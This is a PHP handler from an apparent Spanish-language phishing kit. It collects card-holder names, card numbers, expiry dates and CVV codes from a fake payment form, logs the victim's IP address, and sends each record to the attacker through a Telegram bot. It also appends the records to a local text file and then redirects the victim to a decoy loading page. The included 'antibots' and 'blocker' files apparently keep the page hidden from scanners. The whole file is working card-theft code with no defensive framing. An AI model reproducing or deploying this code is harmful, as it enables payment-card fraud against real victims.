<?php

include "./boots/antibots1.php";
include "./boots/antibots2.php";
include "./boots/antibots3.php";
include "./boots/antibots4.php";
include "./boots/antibots5.php";
include "./boots/antibots6.php";
include "./boots/blocker.php";
include "telegram.php";

$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");

if(isset($_POST['sub'])){
	$message .= '
<<<<<<<<<<<- JATK CVV TARJETA  -<<<<<<<<<<<<<<-
-----------------------------
| nombre tarjeta= '.$_POST['name'].'
| TARJETA  = '.$_POST['namee'].'
| exp-month  = '.$_POST['exp-month'].'
| exp-year = '.$_POST['exp-year'].'
| CVV  = '.$_POST['cvc'].'
------------ '.$ip.' ------------
------------------- By daRknEss -------------------
';
file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );
$file = fopen('sma.txt', 'a');
fwrite($file,$message);
    header("Refresh: 2; URL=Seleccione medio de pago LOADING.html");
    exit();
}
?>